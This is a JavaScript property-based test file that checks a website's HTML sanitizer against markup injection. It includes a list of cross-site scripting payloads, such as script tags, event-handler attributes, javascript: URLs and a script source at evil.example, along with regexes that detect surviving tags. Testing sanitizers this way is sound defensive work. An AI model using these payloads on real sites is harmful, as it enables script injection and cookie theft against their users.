/**
 * Feature: cnspk-website-platform, Property 7: Rendered output is sanitized against markup injection
 *
 * For any string value originating from member, session, or intake data,
 * inserting it into the page after sanitization SHALL yield DOM content
 * containing no executable script and no event-handler attributes.
 *
 * **Validates: Requirements 2.4**
 *
 * Runs in Node, where DOMPurify is absent, so the pure escaping fallback in
 * js/lib/sanitize.js is exercised. The assertions look for *real* tags (a
 * literal `<` opening a script element or any element carrying an `on*`
 * attribute); escaped text such as `&lt;a onclick=...&gt;` is inert in the DOM
 * and correctly does not match. The absence of any parseable executable tag or
 * event-handler-bearing element is the DOM-level safety guarantee of Property 7.
 */
import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { sanitizeHTML } from '../../js/lib/sanitize.js';

// A real <script ...> opening tag survived sanitization.
const SCRIPT_TAG = /<script\b/i;
// A real element that carries an on* event-handler attribute, e.g.
// `<img src=x onerror=...>` or `<a onclick="...">`. Requires a literal `<`
// followed by a tag name, so escaped text never matches.
const ELEMENT_WITH_HANDLER = /<[a-z][^>]*\son[a-z]+\s*=/i;
// A real <iframe>/<object>/<embed> framing element survived.
const FRAMING_TAG = /<(iframe|object|embed)\b/i;

// Curated injection payloads woven into the generated inputs so adversarial
// shapes are always covered alongside fully random strings.
const xssPayloads = fc.constantFrom(
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<a href="javascript:alert(1)">click</a>',
  '<svg/onload=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<div onclick="evil()">x</div>',
  '<input onfocus=alert(1) autofocus>',
  '<scr<script>ipt>alert(1)</script>',
  'onmouseover=alert(1)',
  '<object data="data:text/html,<script>alert(1)</script>"></object>'
);

const dirtyValue = fc.oneof(
  fc.string(),
  fc.fullUnicodeString(),
  xssPayloads,
  // Random text spliced around a payload (payload not at a predictable offset).
  fc.tuple(fc.string(), xssPayloads, fc.string()).map(([a, b, c]) => a + b + c)
);

describe('Property 7: rendered output is sanitized against markup injection', () => {
  it('never yields an executable script tag or event-handler attribute', () => {
    fc.assert(
      fc.property(dirtyValue, (input) => {
        const out = sanitizeHTML(input);

        expect(typeof out).toBe('string');
        expect(SCRIPT_TAG.test(out)).toBe(false);
        expect(ELEMENT_WITH_HANDLER.test(out)).toBe(false);
        expect(FRAMING_TAG.test(out)).toBe(false);
      }),
      { numRuns: 200 }
    );
  });

  it('returns an empty string for nullish input', () => {
    expect(sanitizeHTML(null)).toBe('');
    expect(sanitizeHTML(undefined)).toBe('');
    expect(sanitizeHTML('')).toBe('');
  });
});
